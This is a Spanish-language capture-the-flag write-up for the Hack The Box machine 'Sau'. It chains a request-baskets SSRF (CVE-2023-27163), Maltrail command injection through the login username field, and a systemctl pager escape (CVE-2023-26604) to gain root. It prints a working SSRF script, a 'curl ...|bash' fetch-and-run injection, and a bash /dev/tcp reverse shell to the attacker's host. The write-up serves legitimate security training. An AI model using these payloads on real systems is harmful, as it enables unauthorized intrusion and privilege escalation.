---
title: Sau HTB Writeup
published: 2023-04-05
description: 'Abusamos del CVE-2023-27163 para conseguir una shell, luego CVE-2023-26604 para la Escalada de Privilegios.'
image: './img/1.png'
tags: [Easy, Linux]
category: 'HackTheBox'
draft: false 
---

Sau es una sencilla máquina Hack the Box basada en Linux creada por sau123 que involucra explotación web, Falsificación de Peticiones del Lado del Servidor (SSRF), Vulnerabilidades y Exposiciones Comunes (CVEs), y explotación de políticas Sudo. Un escaneo de puertos reveló inicialmente un servidor HTTP vulnerable a un error SSRF rastreado como CVE-2023-27163. La vulnerabilidad fue explotada para contactar con un servidor HTTP interno que ejecutaba una versión obsoleta de Mailtrail propensa a la inyección de comandos shell, que utilizamos para establecer un shell inverso como puma. La política sudo para este usuario nos permitió explotar CVE-2023-26604 y obtener ejecución como root.

# Initial Recon

Comenzamos realizando un escaneo completo de puertos TCP utilizando el comando nmap. Este comando escanea de forma rápida y fiable cualquier puerto TCP relevante en el objetivo.

```bash
# Run a thorough port scan
nmap "10.10.11.224" -vv -Pn -sT -sV -n -p- -T4 --min-rate=1000 --max-retries=3
```

El escaneo reportó dos puertos abiertos y dos puertos filtrados:

Aquí está la información en formato de tabla:

| Port  | Service | Product | Version |
|-------|---------|---------|---------|
| 22    | ssh     | OpenSSH | 8.4p1   |
| 80    | HTTP    |         |         |
| 8338  | HTTP    |         |         |
| 55555 | HTTP    |         |         |

Primero navegamos a http://10.10.11.224:55555, que nos redirigió a http://10.10.11.224:55555/web. En esta página observamos un pie de página que indicaba que el sitio funcionaba con la versión 1.2.1 de request-baskets.

Buscamos CVEs que afectaran a esta instalación y encontramos un fallo SSRF, CVE-2023-27163. La página CVEDetails de este fallo proporcionaba una descripción de la vulnerabilidad junto con un enlace a detalles de explotación adicionales.

> request-baskets hasta v1.2.1 se descubrió que contiene una falsificación de solicitud del lado del servidor (SSRF) a través del componente /api/baskets/{name}. Esta vulnerabilidad permite a los atacantes acceder a recursos de red e información confidencial a través de una solicitud de API manipulada.

# Web

## CVE-2023-27163

Según la breve prueba de concepto a la que se hace referencia en la página dedicada a CVEDetails, debe realizarse una solicitud HTTP POST especial a /api/baskets/*{:.filepath} para crear una nueva cesta y establecer una URL de reenvío. Se ha creado un sencillo script de shell para agilizar este proceso.

```bash
#!/usr/bin/env zsh
[ $# -lt 1 ] && echo 'Usage: ./ssrf-curl <URL> [OPTS ...]' && exit 1

echo '{"proxy_response":true,"expand_path":true}' |
  jq -c --arg a "$1" '.forward_url=$a' |
  read json

basket=$(openssl rand -hex 8)
curl -so /dev/null -d "$json" "http://10.10.11.224:55555/api/baskets/${basket}"
curl -s "http://10.10.11.224:55555/${basket}" ${@:2}
```

## Mailtrail

Utilizamos este script para acceder indirectamente al servidor HTTP en el puerto 80, ya que no se puede acceder directamente. Se envió una simple petición HTTP GET para verificar la existencia del servidor HTTP y recopilar información.

```bash
# Test SSRF script
zsh ssrf.zsh http://localhost:80 -i | more
```

```
HTTP/1.1 200 OK
Cache-Control: no-cache
Connection: close
Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; img-src * blob:; script-src 'self' 'unsafe-eval' https://stat.ripe.net; frame-src *; object-src 'none'; block-all-mixed-content;
Content-Type: text/html
Date: Thu, 28 Dec 2023 08:44:05 GMT
Last-Modified: Tue, 31 Jan 2023 18:18:07 GMT
Server: Maltrail/0.53
Transfer-Encoding: chunked

<!DOCTYPE html>
...
```

Se encontró una huella digital de software en el encabezado HTTP «Servidor» con el valor «Maltrail/0.53». Hemos buscado en la web vulnerabilidades que afecten a esta versión y hemos encontrado un fallo de inyección de comandos del sistema operativo divulgado aquí.

    >Description

    >Maltrail <= v0.54 is vulnerable to unauthenticated OS command injection during the login process.** Summary

    >[…] An attacker can exploit this vulnerability by injecting arbitrary OS commands into the username parameter. The injected commands will be executed with the privileges of the running process. This vulnerability can be exploited remotely without authentication. Proof of Concept

    > curl ‘http://hostname:8338/login’ —data ‘username=;id > /tmp/bbq’

Parece que la versión instalada puede ser explotada a través del parámetro nombre de usuario en el endpoint de login en http://localhost/login, al que se puede acceder con el script SSRF. Iniciamos una escucha PwnCat y procedimos a ejecutar un simple shell inverso bash descargado a través de HTTP.

```bash
# Start PwnCat listener
lhost="10.10.14.2" # Change to your assigned VPN IP address
pwncat-cs -l $lhost 8443 # Install: `python3 -m pip install pwncat-cs`

# [In another session] Serve reverse shell over HTTP
lhost="10.10.14.2" # Change to your assigned VPN IP address
mkdir ./http-share && echo "bash -i >& /dev/tcp/${lhost}/8443 <&1" > http-share/index.html
http-server ./http-share -p 8080 -a $lhost # Install: `npm install -g http-server`

# [In another session] Trigger command execution
lhost="10.10.14.2" # Change to your assigned VPN IP address
zsh ssrf.zsh http://localhost:80/login -i -d "username=\`curl ${lhost}:8080|bash\`"
```

# Privilege Escalation

Con la ejecución como el usuario puma, Encontramos una política sudo personalizada que nos permite ejecutar un comando en particular como cualquier usuario sin la contraseña de puma.

```bash
# Display sudo policy
sudo -l

Matching Defaults entries for puma on sau:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

## CVE-2023-26604

El comando que podemos ejecutar en un contexto privilegiado es /usr/bin/systemctl status trail.service. Después de buscar en la web vulnerabilidades conocidas en systemd/systemctl, se encontró una CVE de escalada de privilegios bastante reciente rastreada como CVE-2023-26604.

    > systemd before 247 no bloquea adecuadamente la escalada de privilegios local para algunas configuraciones Sudo, por ejemplo, archivos sudoers plausibles en los que se puede ejecutar el comando «systemctl status». Específicamente, systemd no establece LESSSECURE a 1, y por lo tanto otros programas pueden ser lanzados desde el programa less. Esto presenta un riesgo de seguridad sustancial cuando se ejecuta systemctl desde Sudo, porque less se ejecuta como root cuando el tamaño de la terminal es demasiado pequeño para mostrar la salida completa de systemctl.

Comprobamos la versión de systemd y nos dimos cuenta de que estaba instalada la versión vulnerable systemd 245.

```bash
# Check if systemd version is vulnerable
/usr/bin/systemctl --version
```

```bash
systemd 245 (245.4-4ubuntu3.22)
+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid
```
Exploitation

Para explotar la CVE-2023-26604, se bajó la altura del terminal como se describe en la descripción de la CVE, y se ejecutó el comando sudo permitido. Desde el paginador simplemente introdujimos !sh para generar un shell de root.

```bash
# execute systemctl with lower resolution to spawn pager
stty rows 1 && sudo systemctl status trail.service
```

```bash
!sh
```

Root !